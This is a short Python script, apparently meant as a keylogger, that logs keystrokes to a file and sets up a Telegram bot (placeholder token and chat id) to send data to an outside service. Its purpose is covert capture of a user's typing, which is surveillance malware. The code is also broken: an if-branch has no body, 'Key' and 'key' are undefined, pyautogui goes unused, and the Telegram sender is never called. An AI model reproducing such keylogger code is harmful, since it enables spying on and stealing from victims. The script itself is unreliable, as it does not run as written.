import pyautogui
import time
import telebot

# Enter your bot token and chat id here
BOT_TOKEN = 'bot_token'
CHAT_ID = 'chat_id'
LOG_FILE = 'keystrokes.log'

# Initialize the Telegram bot
bot = telebot.TeleBot(BOT_TOKEN)

# Define a function to send messages to the bot
def send_telegram_message(message):
    bot.send_message(chat_id=CHAT_ID, text=message)

# Define a function to record keystrokes
def record_keystrokes(key):
    global last_keystroke
    try:
        last_keystroke = str(key.char)
    except AttributeError:
        if key == Key.space:
        else:
            last_keystroke = str(key)

    if last_keystroke is not None:
        with open(LOG_FILE, 'a') as f:
            f.write(last_keystroke)

            # Wait for 1 minute before recording the next keystroke
            time.sleep(60)

# Call the record_keystrokes function to start recording keystrokes
record_keystrokes(key)
